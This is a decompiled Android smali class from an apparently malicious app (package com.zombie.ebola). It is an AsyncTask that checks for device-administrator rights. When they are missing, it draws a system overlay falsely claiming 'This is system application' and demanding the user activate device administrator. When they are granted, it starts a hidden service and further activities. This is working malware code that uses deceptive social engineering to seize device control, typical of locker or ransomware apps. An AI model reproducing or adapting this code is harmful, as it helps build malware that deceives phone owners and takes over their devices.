.class public Lcom/zombie/ebola/u;
.super Landroid/os/AsyncTask;


# instance fields
.field a:Landroid/view/WindowManager;

.field b:Landroid/view/View;

.field c:Landroid/view/WindowManager$LayoutParams;

.field final synthetic d:Lcom/zombie/ebola/zero;


# direct methods
.method public constructor <init>(Lcom/zombie/ebola/zero;)V
    .locals 1

    const/4 v0, 0x0

    iput-object p1, p0, Lcom/zombie/ebola/u;->d:Lcom/zombie/ebola/zero;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    iput-object v0, p0, Lcom/zombie/ebola/u;->a:Landroid/view/WindowManager;

    iput-object v0, p0, Lcom/zombie/ebola/u;->b:Landroid/view/View;

    iput-object v0, p0, Lcom/zombie/ebola/u;->c:Landroid/view/WindowManager$LayoutParams;

    return-void
.end method

.method private a()V
    .locals 3

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lcom/zombie/ebola/u;->d:Lcom/zombie/ebola/zero;

    invoke-virtual {v1}, Lcom/zombie/ebola/zero;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lcom/zombie/ebola/csero;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "android.intent.action.VIEW"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v1, 0x4000000

    invoke-direct {p0, v0, v1}, Lcom/zombie/ebola/u;->a(Landroid/content/Intent;I)V

    const/high16 v1, 0x40000000    # 2.0f

    invoke-direct {p0, v0, v1}, Lcom/zombie/ebola/u;->b(Landroid/content/Intent;I)V

    const/high16 v1, 0x10000000

    invoke-direct {p0, v0, v1}, Lcom/zombie/ebola/u;->b(Landroid/content/Intent;I)V

    invoke-direct {p0, v0}, Lcom/zombie/ebola/u;->a(Landroid/content/Intent;)V

    return-void
.end method

.method private a(Landroid/content/Intent;)V
    .locals 1

    iget-object v0, p0, Lcom/zombie/ebola/u;->d:Lcom/zombie/ebola/zero;

    invoke-virtual {v0, p1}, Lcom/zombie/ebola/zero;->startActivity(Landroid/content/Intent;)V

    return-void
.end method

.method private a(Landroid/content/Intent;I)V
    .locals 0

    invoke-virtual {p1, p2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    return-void
.end method

.method private a(Landroid/os/Handler;Ljava/lang/Runnable;I)V
    .locals 2

    int-to-long v0, p3

    invoke-virtual {p1, p2, v0, v1}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method private a(Landroid/view/WindowManager;Landroid/view/View;)V
    .locals 1

    :try_start_0
    invoke-interface {p1, p2}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method static synthetic a(Lcom/zombie/ebola/u;)V
    .locals 0

    invoke-direct {p0}, Lcom/zombie/ebola/u;->b()V

    return-void
.end method

.method static synthetic a(Lcom/zombie/ebola/u;Landroid/content/Intent;)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/zombie/ebola/u;->a(Landroid/content/Intent;)V

    return-void
.end method

.method static synthetic a(Lcom/zombie/ebola/u;Landroid/content/Intent;I)V
    .locals 0

    invoke-direct {p0, p1, p2}, Lcom/zombie/ebola/u;->a(Landroid/content/Intent;I)V

    return-void
.end method

.method static synthetic a(Lcom/zombie/ebola/u;Landroid/os/Handler;Ljava/lang/Runnable;I)V
    .locals 0

    invoke-direct {p0, p1, p2, p3}, Lcom/zombie/ebola/u;->a(Landroid/os/Handler;Ljava/lang/Runnable;I)V

    return-void
.end method

.method static synthetic a(Lcom/zombie/ebola/u;Landroid/view/WindowManager;Landroid/view/View;)V
    .locals 0

    invoke-direct {p0, p1, p2}, Lcom/zombie/ebola/u;->a(Landroid/view/WindowManager;Landroid/view/View;)V

    return-void
.end method

.method private a(Landroid/content/ComponentName;)Z
    .locals 2

    const-string v0, ".DeviceAdminAdd"

    invoke-virtual {p1}, Landroid/content/ComponentName;->getShortClassName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    return v0
.end method

.method static synthetic a(Lcom/zombie/ebola/u;Landroid/content/ComponentName;)Z
    .locals 1

    invoke-direct {p0, p1}, Lcom/zombie/ebola/u;->a(Landroid/content/ComponentName;)Z

    move-result v0

    return v0
.end method

.method static synthetic b(Lcom/zombie/ebola/u;)Lcom/zombie/ebola/zero;
    .locals 1

    iget-object v0, p0, Lcom/zombie/ebola/u;->d:Lcom/zombie/ebola/zero;

    return-object v0
.end method

.method private b()V
    .locals 3

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lcom/zombie/ebola/u;->d:Lcom/zombie/ebola/zero;

    invoke-virtual {v1}, Lcom/zombie/ebola/zero;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lcom/zombie/ebola/bobS;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "android.intent.action.VIEW"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v1, 0x10000000

    invoke-direct {p0, v0, v1}, Lcom/zombie/ebola/u;->b(Landroid/content/Intent;I)V

    invoke-direct {p0, v0}, Lcom/zombie/ebola/u;->a(Landroid/content/Intent;)V

    return-void
.end method

.method private b(Landroid/content/Intent;I)V
    .locals 0

    invoke-virtual {p1, p2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    return-void
.end method

.method static synthetic b(Lcom/zombie/ebola/u;Landroid/content/Intent;I)V
    .locals 0

    invoke-direct {p0, p1, p2}, Lcom/zombie/ebola/u;->b(Landroid/content/Intent;I)V

    return-void
.end method


# virtual methods
.method protected varargs a([Ljava/lang/Void;)Ljava/lang/String;
    .locals 8

    const/4 v7, 0x0

    const/4 v1, -0x2

    iget-object v0, p0, Lcom/zombie/ebola/u;->d:Lcom/zombie/ebola/zero;

    const-string v2, "device_policy"

    invoke-virtual {v0, v2}, Lcom/zombie/ebola/zero;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    iget-object v2, p0, Lcom/zombie/ebola/u;->d:Lcom/zombie/ebola/zero;

    const-string v3, "window"

    invoke-virtual {v2, v3}, Lcom/zombie/ebola/zero;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    move-object v6, v2

    check-cast v6, Landroid/view/WindowManager;

    new-instance v2, Landroid/content/ComponentName;

    iget-object v3, p0, Lcom/zombie/ebola/u;->d:Lcom/zombie/ebola/zero;

    invoke-virtual {v3}, Lcom/zombie/ebola/zero;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-class v4, Lcom/zombie/ebola/goro;

    invoke-direct {v2, v3, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v2}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/zombie/ebola/u;->d:Lcom/zombie/ebola/zero;

    new-instance v1, Landroid/content/Intent;

    iget-object v2, p0, Lcom/zombie/ebola/u;->d:Lcom/zombie/ebola/zero;

    invoke-virtual {v2}, Lcom/zombie/ebola/zero;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lcom/zombie/ebola/jora;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Lcom/zombie/ebola/zero;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    invoke-direct {p0}, Lcom/zombie/ebola/u;->a()V

    move-object v0, v7

    :goto_0
    return-object v0

    :cond_0
    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    const/16 v3, 0x7da

    const/16 v4, 0x400

    const/4 v5, -0x3

    move v2, v1

    invoke-direct/range {v0 .. v5}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    iget-object v1, p0, Lcom/zombie/ebola/u;->d:Lcom/zombie/ebola/zero;

    const-string v2, "layout_inflater"

    invoke-virtual {v1, v2}, Lcom/zombie/ebola/zero;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/LayoutInflater;

    const v2, 0x7f030008

    invoke-virtual {v1, v2, v7}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v3

    const v1, 0x7f070039

    invoke-virtual {v3, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/Button;

    const v2, 0x7f070038

    invoke-virtual {v3, v2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/TextView;

    const-string v4, "\nAction "

    const-string v5, "required.\n\nThis is system application.\n\n   You must activate device administator.   \n"

    invoke-virtual {v4, v5}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iput-object v6, p0, Lcom/zombie/ebola/u;->a:Landroid/view/WindowManager;

    iput-object v3, p0, Lcom/zombie/ebola/u;->b:Landroid/view/View;

    iput-object v0, p0, Lcom/zombie/ebola/u;->c:Landroid/view/WindowManager$LayoutParams;

    new-instance v0, Lcom/zombie/ebola/v;

    invoke-direct {v0, p0, v3, v2, v1}, Lcom/zombie/ebola/v;-><init>(Lcom/zombie/ebola/u;Landroid/view/View;Landroid/widget/TextView;Landroid/widget/Button;)V

    invoke-virtual {v1, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    const-string v0, "na"

    goto :goto_0
.end method

.method protected a(Ljava/lang/String;)V
    .locals 3

    invoke-super {p0, p1}, Landroid/os/AsyncTask;->onPostExecute(Ljava/lang/Object;)V

    if-eqz p1, :cond_0

    const-string v0, "na"

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/zombie/ebola/u;->a:Landroid/view/WindowManager;

    iget-object v1, p0, Lcom/zombie/ebola/u;->b:Landroid/view/View;

    iget-object v2, p0, Lcom/zombie/ebola/u;->c:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v0, v1, v2}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    :cond_0
    return-void
.end method

.method protected varargs synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    check-cast p1, [Ljava/lang/Void;

    invoke-virtual {p0, p1}, Lcom/zombie/ebola/u;->a([Ljava/lang/Void;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method protected synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/zombie/ebola/u;->a(Ljava/lang/String;)V

    return-void
.end method
